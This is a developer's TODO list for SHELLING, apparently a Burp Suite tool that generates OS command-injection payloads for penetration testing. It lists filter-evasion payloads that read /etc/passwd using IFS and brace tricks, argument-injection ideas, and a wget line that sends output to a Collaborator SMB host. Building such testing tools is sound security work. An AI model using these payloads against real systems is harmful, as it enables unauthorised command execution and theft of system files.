SHELLING TODO
--------------------------------
TODO for the current release (before pushing this to the store):

- UNC!

- test the tar thing, add known injections or remove them from the interface for now if none of them is implemented

- finish the features and options already available in the GUI (arg injection)

- check payload 8 base for false negatives and shit that does not make sense:

- Make sure the menu does not fuck up under lower resolutions (I am pretty sure it still does)

- SHIP IT!

TODO for the next release:
- Documentation
- Warn about the scope issue in the documentation!
- quotes!!!
- Some form of best effort payloads
- payload number recalculation function for each config change, to update the "Save CNT payloads" tab title (so we'll know in advance how many payloads will be produced with the current confgiruation
Also, we can compare the counter with the actual size to check for duplicates/skipped paylaods

custom command syntax
OS-specific improvements:
	- nix: https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html#known-bypassesexploits
	- nix: Introduce this IFS=,;`cat<<<uname,-a` by https://twitter.com/MrHappiey
	- nix: reiterate through  (thanks to https://twitter.com/omespino/status/1001484143426002944)
	- nix: AND https://gtfobins.github.io/gtfobins/tar/ and the like (for known injections, there's plenty of them as it turns out - a manageable list with predefined values would be better
IFS=,;`cat<<<cat,/etc/passwd`
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat</etc/passwd                 
{cat,/etc/passwd} OR {ls,-las,/var} with args
X=$'cat\x20/etc/passwd'&&$X

	- nix: -exec, -e, -r and other argument injections for direct code execution are encouraged ;]
	- nix: -o, -O and -out are also good outputfile candidates in nix, the problem is we don't have UNC support... or do we? what about URLs to other protocols, like scp:// and the like?
		we have to figure out something like:
		wget http://wp.pl -O smb://fdwi7155tpq9htil8kigfkgfh6nwbl.burpcollaborator.net/share/public/file.txt
		
	- nix: also, consider injections into sh expressions (?)
	- nix + win envirables inspirations from CONFidence

	- win: the windows argument injection pattern /c "command" I "figured out" after reading the recently released reference
	- win: additional argument separators for windows: ;-_,=/ (find out compatible commands, as echo/type are fine, while ping fails)
	- win: check that obfuscation trick from Daniel's presentation (and prolly do more research on the subject)



- response-based analysis as an additional feedback channel (for Scanner) and argument injection

Improve the payload set:
	- check the full paylaod set for incorrect payloads (ones that do not make sense -> will always fail)
	- profiles (make a very good-effort, but optimized, default payload list) - 10-50 most effective payloads

BTW: The worst thing about Burp Collaborator is the payload length; much better to have a private instance at a domain as short as possible. Also, for private use, the length of the domain identifier could be much shorter (in most cases even one byte would do the trick).
